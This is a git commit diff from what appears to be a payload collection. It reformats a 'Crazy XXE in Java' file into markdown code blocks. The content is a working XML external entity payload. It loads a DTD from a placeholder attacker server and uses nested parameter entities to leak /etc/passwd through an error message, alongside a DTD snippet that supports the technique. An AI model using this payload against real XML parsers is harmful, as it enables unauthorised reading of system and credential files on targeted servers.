3228d5bd18b42574f9147341d703d1a158c4db31
JakubHeba <61252870+JakubHeba@users.noreply.github.com>
2020-02-27 12:24:23 +0100

    Update and rename Crazy XXE in Java.xml to Crazy XXE in Java.sh

--- Crazy XXE in Java.sh
+++ Crazy XXE in Java.sh
@@ -1,9 +1,11 @@
+```xml
 <?xml version=\"1.0\"?>
 <!DOCTYPE message [<!ENTITY % local_dtd SYSTEM \"http://{Attacker_server}/test.dtd\">
 <!ENTITY % condition 'aaa)><!ENTITY &#x25; file SYSTEM \"file:///etc/passwd\">
 <!ENTITY &#x25; eval \"<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>\">&#x25;eval;&#x25;error;<!ELEMENT aa (bb'>%local_dtd;]>
-
-DTD File:
-
+```
+<b>DTD File:</b>
+```xml
 <!ENTITY % condition "and | or | not | equal | contains | exists | subdomain-of">
 <!ELEMENT pattern (%condition;)>
+```
